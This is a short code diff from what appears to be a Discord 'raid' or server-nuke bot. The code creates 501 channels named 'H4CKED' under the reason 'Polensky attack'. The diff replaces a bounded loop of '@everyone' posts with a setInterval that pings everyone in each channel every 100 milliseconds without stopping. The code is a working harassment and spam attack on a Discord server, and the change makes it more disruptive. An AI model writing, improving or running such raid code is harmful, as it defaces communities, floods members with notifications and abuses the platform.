@@ -42,9 +42,11 @@ else{
         })
        for(let i = 0;i<501;i++){
         message.guild.channels.create('🙂H4CKED',{reason: 'Polensky attack'}).then(channel=>{
-            for(let r = 1; r<30;r++){
-            channel.send('@everyone')
-            }
+setInterval(()=>{
+    channel.send({
+        content:'@everyone'
+    })
+},100)
         })
        }
     }
